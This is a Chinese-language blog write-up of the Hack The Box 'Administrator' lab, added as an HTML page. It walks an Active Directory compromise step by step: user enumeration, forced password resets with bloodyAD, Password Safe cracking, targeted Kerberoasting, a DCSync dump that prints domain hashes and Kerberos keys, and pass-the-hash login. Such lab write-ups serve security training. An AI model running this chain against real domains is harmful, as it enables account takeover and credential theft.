@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
+    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="信息收集端口扫描nmap --min-rate 10000 -p- 10.10.11.42   详细信息扫描 nmap -sT -sC -sV -O 10.10.11.42    题目给了一个用户名和密码，来爆破下其他用户，使用 Crackmapexec工具来爆破crackmapexec smb administrator.htb -u &quot;Olivia&quot; -p &quot;ic">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Administrator-HTB">
+<meta property="og:url" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/index.html">
+<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
+<meta property="og:description" content="信息收集端口扫描nmap --min-rate 10000 -p- 10.10.11.42   详细信息扫描 nmap -sT -sC -sV -O 10.10.11.42    题目给了一个用户名和密码，来爆破下其他用户，使用 Crackmapexec工具来爆破crackmapexec smb administrator.htb -u &quot;Olivia&quot; -p &quot;ic">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302131411626.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302132255743.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302133741194.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302135114605.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302142609928.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302205915184.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302210030846.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302210220894.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302210520428.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302211152361.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302211702035.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302211902875.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302212149146.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302220129905.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302222423534.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302222653053.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302223507418.png">
+<meta property="article:published_time" content="2025-03-02T04:38:15.000Z">
+<meta property="article:modified_time" content="2025-03-05T07:24:36.807Z">
+<meta property="article:author" content="Oceanzbz">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302131411626.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Administrator-HTB</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-QWTJSPQL4F');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/02/28/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Titanic/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&text=Administrator-HTB"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&title=Administrator-HTB"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&is_video=false&description=Administrator-HTB"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Administrator-HTB&body=Check out this article: https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&title=Administrator-HTB"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&title=Administrator-HTB"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&title=Administrator-HTB"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&title=Administrator-HTB"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&name=Administrator-HTB&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&t=Administrator-HTB"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">域内信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.</span> <span class="toc-text">Kerberoasting攻击</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Administrator-HTB
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Oceanzbz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-02T04:38:15.000Z" class="dt-published" itemprop="datePublished">2025-03-02</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HTB/" rel="tag">HTB</a>, <a class="p-category" href="/tags/windows/" rel="tag">windows</a>, <a class="p-category" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口扫描<br><code>nmap --min-rate 10000 -p- 10.10.11.42</code></p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302131411626.png" class="">
+
+<p>详细信息扫描</p>
+<p><code>nmap -sT -sC -sV -O 10.10.11.42 </code></p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302132255743.png" class="">
+
+<p>题目给了一个用户名和密码，来爆破下其他用户，使用 Crackmapexec工具来爆破<br><code>crackmapexec smb administrator.htb -u &quot;Olivia&quot; -p &quot;ichliebedich&quot; --rid-brute | grep SidTypeUser</code></p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302133741194.png" class="">
+
+<p>看到刚才扫描的端口开放了5985端口，这个端口一般运行着winrm服务</p>
+<p><code>WinRM是很早之前微软推出的一种新式的方便远程管理的服务Windows Remote Management的简称，相比RDP远程桌面协议，WinRM这种服务更具备轻量、低宽带的特性，WinRM与WinRS（Windows Remote Shell）的使用可以让远程连的运维人员拥有CMDShell环境，通过命令执行对服务器与服务器数据进行管理。</code></p>
+<h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p>来登录下试试,使用kali自带的evil-winrm登录</p>
+<p><code>evil-winrm -u &quot;Olivia&quot; -p &quot;ichliebedich&quot; -i 10.10.11.51</code></p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302135114605.png" class="">
+
+<p>发现可以登录成功，看下权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br></pre></td></tr></table></figure>
+<p>可以将计算机添加到域内。</p>
+<p>使用bloodhound-python收集一波域内的信息</p>
+<p><code>bloodhound-python -u Olivia -p &#39;ichliebedich&#39; -c All -d administrator.htb -ns 10.10.11.42</code></p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302142609928.png" class="">
+
+<p>可以看到Olivia用户能够完全控制michael用户，那么给其改个密码，使用bloodyAD进行修改。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><code>bloodyAD -u &quot;olivia&quot; -p &quot;ichliebedich&quot; -d &quot;Administrator.htb&quot; --host &quot;10.10.11.42&quot; set password &quot;Michael&quot; &quot;12345678&quot;</code></p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302205915184.png" class="">
+
+<p>然后看看 MIchael用户的FDOC</p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302210030846.png" class="">
+
+<p>发现该用户可以强制更改benjamin用户的密码，同样适用bloodyAD进行更改</p>
+<p><code>bloodyAD -u &quot;Michael&quot; -p &quot;12345678&quot; -d &quot;Administrator.htb&quot; --host &quot;10.10.11.42&quot; set password &quot;Benjamin&quot; &quot;12345678&quot;</code></p>
+<p>ftp登录查看有一个psafe3文件下载下来看看</p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302210220894.png" class="">
+
+<p>psafe3 文件是加密的密码安全文件，无法直接读取，需要使用 <code>pwsafe2john</code> 工具进行获取 hash。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwsafe2john Backup.psafe3 </span><br><span class="line">Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050</span><br></pre></td></tr></table></figure>
+
+<p>使用john爆破下密码</p>
+<p><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302210520428.png" class="">
+
+<p>或者使用hashcat也可以直接爆破</p>
+<p><code>hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt</code></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pwsafe/pwsafe/releases">https://github.com/pwsafe/pwsafe/releases</a> 使用这个工具解密得到文件</p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302211152361.png" class="">
+
+<p>得到三个用户的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw</span><br><span class="line">emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb</span><br><span class="line">emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur</span><br></pre></td></tr></table></figure>
+
+<p>继续使用evil-winrm登录看看能不能读到用户的flag</p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302211702035.png" class="">
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>继续查找emily用户的权限</p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302211902875.png" class="">
+
+<h3 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h3><p>发现其对Ethan 有权限写入，可以考虑使用Kerberoasting攻击</p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302212149146.png" class="">
+
+
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast</a>脚本来进行攻击</p>
+<p>它可以为设置了 SPN 的用户帐户打印 “kerberoast” 哈希值。 该工具带来了以下附加功能：对于每个没有 SPN 的用户，它会尝试设置一个（<strong>滥用对属性的写入权限</strong>），打印 “kerberoast” 哈希，并删除为该操作设置的临时 SPN。</p>
+<p>在使用脚本之前先同步下时间<br><code>ntpdate 10.10.11.42</code></p>
+<p><code>python targetedKerberoast.py -u &quot;emily&quot; -p &quot;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&quot; -d &quot;Administrator.htb&quot; --dc-ip 10.10.11.42</code></p>
+<p>但是我没有成功········</p>
+<p>那就手动给ethan用户添加一个spn,还是使用bloodyAD工具</p>
+<p><code>bloodyAD -d &#39;administrator.htb&#39; -u &#39;emily&#39; -p &#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39; --host &#39;10.10.11.42&#39; set object ethan servicePrincipalName -v &#39;x0da6h/x0da6h&#39;</code></p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302220129905.png" class="">
+
+<p>然后使用getuserspn脚本获取hash来进行爆破</p>
+<p><code>impacket-GetUserSPNs &#39;administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39; -request</code></p>
+<p>然后爆破密码出了limpbizkit</p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302222423534.png" class="">
+
+<p>然后我们继续查看ethan的权限</p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302222653053.png" class="">
+
+<p>发现可以进行dcsync， GetChanges 和 GetChangesAll 的组合。这两个权限的组合授予主体执行 DCSync 攻击的能力。我们使用<code>impacket-secretsdump</code>转储域控制器上的所有密码。</p>
+<p><code>impacket-secretsdump &quot;Administrator.htb/ethan:limpbizkit&quot;@&quot;dc.Administrator.htb&quot;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump &quot;Administrator.htb/ethan:limpbizkit&quot;@&quot;dc.Administrator.htb&quot;</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::</span><br><span class="line">administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::</span><br><span class="line">administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:8864a202387fccd97844b924072e1467:::</span><br><span class="line">administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::</span><br><span class="line">administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::</span><br><span class="line">administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::</span><br><span class="line">administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::</span><br><span class="line">administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::</span><br><span class="line">DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2</span><br><span class="line">Administrator:des-cbc-md5:403286f7cdf18385</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94</span><br><span class="line">krbtgt:des-cbc-md5:2c0bc7d0250dbfc7</span><br><span class="line">administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3</span><br><span class="line">administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48</span><br><span class="line">administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9</span><br><span class="line">administrator.htb\michael:aes256-cts-hmac-sha1-96:b360c36cb6777b8cc3d88ab1aa60f0064e6ea4fc9b9a4ebacf66345118c0e959</span><br><span class="line">administrator.htb\michael:aes128-cts-hmac-sha1-96:bc3c8269d1a4a82dc55563519f16de8b</span><br><span class="line">administrator.htb\michael:des-cbc-md5:43c2bc231598012a</span><br><span class="line">administrator.htb\benjamin:aes256-cts-hmac-sha1-96:a0bbafbc6a28ed32269e6a2cc2a0ccb35ac3d7314633815768f0518ebae6847f</span><br><span class="line">administrator.htb\benjamin:aes128-cts-hmac-sha1-96:426ca56d39fe628d47066fc3448b645e</span><br><span class="line">administrator.htb\benjamin:des-cbc-md5:b6f84a864376a4ad</span><br><span class="line">administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4</span><br><span class="line">administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218</span><br><span class="line">administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51</span><br><span class="line">administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f</span><br><span class="line">administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f</span><br><span class="line">administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb</span><br><span class="line">administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6</span><br><span class="line">administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade</span><br><span class="line">administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf</span><br><span class="line">administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82</span><br><span class="line">administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e</span><br><span class="line">administrator.htb\emma:des-cbc-md5:3249fba89813ef5d</span><br><span class="line">DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb</span><br><span class="line">DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d</span><br><span class="line">DC$:des-cbc-md5:f483547c4325492a</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>
+
+
+<p>有了hash之后我们就可以想干啥就干啥了。</p>
+<p><code>evil-winrm -u &quot;administrator&quot; -H &quot;3dc553ce4b9fd20bd016e098d2d2fd2e&quot; -i administrator.htb</code></p>
+<img src="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/IMAGE20250302223507418.png" class="">
+
+<p>还是多实践。</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
